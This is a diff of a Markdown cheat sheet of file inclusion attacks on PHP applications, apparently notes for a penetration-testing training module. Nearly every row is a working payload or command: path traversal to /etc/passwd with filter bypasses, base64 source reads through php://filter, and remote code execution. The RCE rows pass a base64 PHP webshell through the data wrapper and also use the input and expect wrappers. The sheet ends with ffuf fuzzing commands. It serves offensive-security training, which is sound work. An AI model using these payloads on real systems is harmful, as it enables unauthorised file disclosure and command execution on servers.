@@ -13,21 +13,27 @@
 | `/index.php?language=/../../../etc/passwd` | LFI with name prefix. |
 | `GET /index.php?language=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd` | [Using the file inclusion find the name of a user on the system](https://academy.hackthebox.com/module/23/section/251) |
 | `/index.php?language=./languages/../../../../etc/passwd` | LFI with approved path |
+| `GET /index.php?language=languages/....//....//....//....//...//flag.txt` | LFI with approved path of `languages/` in front and escaping filter. |
 | **LFI Bypasses** |
-| `/index.php?language=....//....//....//....//etc/passwd` | Bypass basic path [traversal filter](https://academy.hackthebox.com/module/23/section/1491) |
-| `/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64` | Bypass filters with URL encoding |
+| `/index.php?language=....//....//....//....//....//etc/passwd` | Bypass basic path [traversal filter](https://academy.hackthebox.com/module/23/section/1491) |
+| `/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64` | Bypass filters with URL encoding - [Online URL Decode Encoder](https://www.urldecoder.org/) |
 | `/index.php?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]` | Bypass appended extension with path truncation (obsolete) |
-| `echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done` | This bash script will produce the required 2048 times string traversal path |
+| `echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done` | This bash script will produce the required 2048 times string traversal path to filter and truncate the php extension. |
 | `/index.php?language=../../../../etc/passwd%00` | Bypass appended extension with `null byte` (obsolete) |
-| `/index.php?language=php://filter/read=convert.base64-encode/resource=config` | Read PHP with base64 filter |
+| `/index.php?language=php://filter/read=convert.base64-encode/resource=config` | Read PHP with base64 filter - [PHP Filters](https://academy.hackthebox.com/module/23/section/1492) |
 
 
-## Remote Code Execution
+## Remote Code Execution  
+
+>The expect wrapper, which allows us to directly run commands through URL streams. Expect works very similarly to the web shells.
+>The data wrapper can be used to include external data, including PHP code. However, the data wrapper is only available to use if the `allow_url_include` setting is enabled in the PHP configurations.
 
 | **Command** | **Description** |
 | --------------|-------------------|
 | **PHP Wrappers** |
-| `/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id` | RCE with data wrapper |
+| `/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id` | [RCE with data wrapper](https://academy.hackthebox.com/module/23/section/253) |
+| `echo '<?php system($_GET["cmd"]); ?>' | base64` | Produce the base64 string `PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==` used above webshell that can be passed in to the data wrapper to get command execution |
+| `curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"` | Checking PHP Configurations, Once we have the base64 encoded string, we can decode it and grep for allow_url_include to see its value |
 | `curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"` | RCE with input wrapper |
 | `curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"` | RCE with expect wrapper |
 | **RFI** |
@@ -52,6 +58,7 @@
 
 | **Command** | **Description** |
 | --------------|-------------------|
+| `ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php` | Fuzzing for PHP Files |
 | `ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287` | Fuzz page parameters |
 | `ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287` | Fuzz LFI payloads |
 | `ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287` | Fuzz webroot path |
